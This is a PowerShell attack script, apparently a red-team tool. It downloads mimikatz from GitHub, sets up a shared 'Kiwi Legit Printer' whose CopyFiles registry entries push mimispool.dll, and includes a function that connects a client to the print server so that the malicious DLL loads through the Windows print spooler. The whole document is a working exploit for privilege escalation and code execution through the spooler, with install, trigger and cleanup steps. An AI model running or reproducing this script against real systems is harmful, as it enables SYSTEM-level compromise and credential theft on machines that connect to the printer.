function Install-KiwiPrinter {

    param (
        [Parameter(Mandatory=$false, HelpMessage="Path to the mimikatz_trunk.zip archive.")]
        [String]$Archive
    )

    $printerName     = 'Kiwi Legit Printer'
    $system32        = $env:systemroot + '\system32'
    $drivers         = $system32 + '\spool\drivers'
    $RegStartPrinter = 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\' + $printerName

    if ( ! $Archive ) {
        Invoke-WebRequest -Uri 'https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip' -OutFile '.\mimikatz_trunk.zip'
        $mimikatzPath = '.\mimikatz_trunk'
    } else {
        $mimikatzPath = $Archive
    }

    Expand-Archive -Path $mimikatzPath -DestinationPath '.\mimikatz_trunk'

    Copy-Item -Force -Path ($system32 + '\mscms.dll')             -Destination ($system32 + '\mimispool.dll')
    Copy-Item -Force -Path '.\mimikatz_trunk\x64\mimispool.dll'   -Destination ($drivers  + '\x64\3\mimispool.dll')
    Copy-Item -Force -Path '.\mimikatz_trunk\win32\mimispool.dll' -Destination ($drivers  + '\W32X86\3\mimispool.dll')

    Add-PrinterDriver -Name       'Generic / Text Only'
    Add-Printer       -DriverName 'Generic / Text Only' -Name $printerName -PortName 'FILE:' -Shared

    New-Item         -Path ($RegStartPrinter + '\CopyFiles')        | Out-Null

    New-Item         -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   | Out-Null
    New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Directory' -PropertyType 'String'      -Value 'x64\3'           | Out-Null
    New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null
    New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null

    New-Item         -Path ($RegStartPrinter + '\CopyFiles\Litchi') | Out-Null
    New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Directory' -PropertyType 'String'      -Value 'W32X86\3'        | Out-Null
    New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null
    New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null

    New-Item         -Path ($RegStartPrinter + '\CopyFiles\Mango')  | Out-Null
    New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Directory' -PropertyType 'String'      -Value $null             | Out-Null
    New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Files'     -PropertyType 'MultiString' -Value $null             | Out-Null
    New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Module'    -PropertyType 'String'      -Value 'mimispool.dll'   | Out-Null

    Remove-Item -Recurse '.\mimikatz_trunk'
    Remove-Item '.\mimikatz_trunk.zip'
}

function Uninstall-KiwiPrinter {
    $printerName     = 'Kiwi Legit Printer'
    $system32        = $env:systemroot + '\system32'
    $drivers         = $system32 + '\spool\drivers'

    Remove-Printer       -Name $printerName
    Start-Sleep -Seconds 2
    Remove-PrinterDriver -Name 'Generic / Text Only'

    Remove-Item -Force -Path ($drivers  + '\x64\3\mimispool.dll')
    Remove-Item -Force -Path ($drivers  + '\W32X86\3\mimispool.dll')
    Remove-Item -Force -Path ($system32 + '\mimispool.dll')
}

function Invoke-KiwiPrinter {

    param (
        [Parameter(Mandatory=$true, HelpMessage="IP address or domain name of the server, e.g. print.lab.local.")]
        [String]$Server,

        [Parameter(Mandatory=$false, HelpMessage="Username for the print server.")]
        [String]$Username,

        [Parameter(Mandatory=$false, HelpMessage="Password for the print server.")]
        [String]$Password
    )

    $printerName = 'Kiwi Legit Printer'
    $fullprinterName = '\\' + $Server + '\' + $printerName

    if ( $Username -And $Password ) {
        $credential = (New-Object System.Management.Automation.PSCredential($Username, (ConvertTo-SecureString -AsPlainText -String $Password -Force)))

        Remove-PSDrive -Force -Name 'KiwiLegitPrintServer' -ErrorAction SilentlyContinue
        Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue

        New-PSDrive -Name 'KiwiLegitPrintServer' -Root ('\\' + $Server + '\print$') -PSProvider FileSystem -Credential $credential | Out-Null
        Add-Printer -ConnectionName $fullprinterName

        Remove-PSDrive -Force -Name 'KiwiLegitPrintServer'
    } else {
        Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue
        Add-Printer -ConnectionName $fullprinterName
    } 

    $driver = (Get-Printer -Name $fullprinterName).DriverName
    Remove-Printer -Name $fullprinterName
    Remove-PrinterDriver -Name $driver
}